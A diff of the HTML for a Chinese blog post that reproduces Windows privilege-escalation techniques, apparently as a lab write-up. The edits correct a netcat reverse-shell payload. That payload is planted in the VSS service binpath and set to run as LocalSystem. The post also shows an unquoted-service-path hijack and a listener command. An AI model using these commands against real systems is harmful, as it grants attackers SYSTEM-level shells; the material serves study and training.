@@ -98,7 +98,7 @@
 <meta property="og:image" content="https://k-ring.github.io/img/windows9.jpg">
 <meta property="og:image" content="https://k-ring.github.io/img/windows10.jpg">
 <meta property="og:image" content="https://k-ring.github.io/img/windows11.jpg">
-<meta property="og:updated_time" content="2019-10-08T06:32:50.410Z">
+<meta property="og:updated_time" content="2019-10-08T08:08:43.482Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="windows部分提权方法复现和记录">
 <meta name="twitter:description" content="前言记录并复现提权的常用姿势，方便在以后理解并使用。     为什么要提权？因为一般我们通过web获取到的系统管理权限非常低，比如linux下的话通常就是www权限，这个权限基本限制了我们只能在web目录下执行一些有限的操作。   那么想要获取到系统更多的信息和进行更多的操作，就需要更高的权限。通常常用的两个系统高权限：Linux：root权限Windows：system权限">
@@ -378,7 +378,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  3,417 字
+                  3,490 字
                 </span>
               
 
@@ -558,7 +558,7 @@
 <p>我这里存在三个服务是不加引号的错误配置，在<code>C:\Program File (x86)</code>这里存在空格，要使服务再次启动时调用我们的恶意程序，我们应该有一个名为Program.exe的恶意程序放在C盘根目录下，当重启服务，遇到空格时就会调用C:\Program.exe程序。     </p>
 <p>我的恶意程序代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Program.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	system(<span class="string">"whoami &gt; D:\\whoami.txt"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>然后编译成<code>Program.exe</code>文件，放到C盘根目录下。    </p>
-<p>重新启动服务，此处可能由于权限低，无法重启服务，那么就只有强制重启服务器<code>shutdown -r -t0</code>，当服务器重新开启时，就能运行我们的恶意程序。    </p>
+<p>重新启动服务，此处可能由于权限低，无法重启服务，那么就只有强制重启服务器<code>shutdown -r -t 0</code>，当服务器重新开启时，就能运行我们的恶意程序。    </p>
 <p><img src="https://k-ring.github.io/img/windows13.jpg" alt>    </p>
 <p>成功获取到system权限。    </p>
 <h4 id="需要条件"><a href="#需要条件" class="headerlink" title="需要条件"></a>需要条件</h4><ul>
@@ -587,8 +587,10 @@
 <p><code>VSS</code>服务能成功启动，所以这里我选择使用<code>VSS</code>服务。     </p>
 <p>使用<code>sc qc VSS</code>命令查看该服务信息：<br><img src="https://k-ring.github.io/img/windows7.jpg" alt>   </p>
 <p>在<code>BINARY_PATH_NAME</code>参数的内容<code>C:\Windows\system32\vssvc.exe</code>就是当VSS服务启动时系统调用的命令，<code>SERVICE_START_NAME</code>参数内容就是该服务运行时的权限。<br>我们要做的就是将前一个参数内容植入我们的payload(此处payload为nc调用cmd反弹shell的命令)，后一个参数改为系统权限LocalSystem。     </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sc config VSS binpath= &quot;C:\windows\temp\nc.exe -nv 192.168.159.165 -e C:\windows\system32\cmd.exe&quot;</span><br><span class="line"></span><br><span class="line">sc qc VSS</span><br><span class="line"></span><br><span class="line">sc config VSS obj= &quot;.\LocalSystem&quot; password= &quot;&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="https://k-ring.github.io/img/windows8.jpg" alt><br>(我之前已经复现过，所以这里第二个参数已经被我改了，不用纠结我还没有设置运行权限就已经是LocalSystem，如果设置过程中发现没有权限可以换一个其他服务)    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sc config VSS binpath= &quot;C:\windows\temp\nc.exe -nv 192.168.159.165 9999 -e C:\windows\system32\cmd.exe&quot;</span><br><span class="line"></span><br><span class="line">sc qc VSS</span><br><span class="line"></span><br><span class="line">sc config VSS obj= &quot;.\LocalSystem&quot; password= &quot;&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://k-ring.github.io/img/windows8.jpg" alt>   </p>
+<p><strong>图片中第二个红色框框里面有问题，还差一个监听的端口，当时改了之后忘了更换截图，上面的命令以成功更改。正确的内容应该为<code>C:\windows\temp\nc.exe -nv 192.168.159.165 9999 -e C:\windows\system32\cmd.exe</code></strong></p>
+<p>(我之前已经复现过，所以这里第二个参数已经被我改了，不用纠结我还没有设置运行权限就已经是LocalSystem，如果设置过程中发现没有权限可以换一个其他服务)    </p>
 <p>启动内容和启动权限设置好了，通过<code>sc qc VSS</code>查看该服务内容是否被成功修改。     </p>
 <p>如果修改成功，后面只需启动服务即可反弹一个system权限的shell：    </p>
 <p>首先在本地监听一个端口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -lvvp 9999</span><br></pre></td></tr></table></figure></p>
@@ -832,7 +834,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">41.3k</span>
+    <span title="Site words total count">41.4k</span>
   
 </div>
 
